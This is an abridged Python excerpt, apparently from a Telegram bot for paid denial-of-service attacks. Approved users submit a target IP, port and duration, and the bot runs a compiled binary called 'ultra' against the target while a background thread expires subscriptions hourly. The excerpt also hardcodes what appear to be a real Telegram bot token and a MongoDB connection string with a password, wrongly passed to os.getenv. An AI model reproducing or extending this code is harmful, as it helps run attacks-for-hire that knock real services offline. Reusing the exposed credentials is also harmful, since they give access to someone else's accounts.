...
TOKEN = os.getenv('8654483320:AAFFfd8RttdtK4ytvdAiUGh1Oe5WNc8Ebdk')
MONGO_URI = os.getenv('mongodb+srv://Soul:JYAuvlizhw7wqLOb@soul.tsga4.mongodb.net')
...
# Global asyncio loop (will be set in the thread)
loop = None
...
# Background thread to run expiry check every hour
def expiry_checker():
    while True:
        time.sleep(3600)  # 1 hour
        extend_and_clean_expired_users()

async def run_attack_command_async(chat_id, target_ip, target_port, duration, message_id):
    # Run the compiled binary (make sure 'ultra' is in the same folder and executable)
...
def approve_or_disapprove_user(message):
    ...
    # Fix: handle case when not a reply
...
def handle_attack_command(message):
    ...
    try:
        ...
        asyncio.run_coroutine_threadsafe(
            run_attack_command_async(chat_id, target_ip, target_port, duration, sent_message.message_id),
            loop
        )
...
if __name__ == "__main__":
    ...
    expiry_thread = Thread(target=expiry_checker, daemon=True)
    expiry_thread.start()
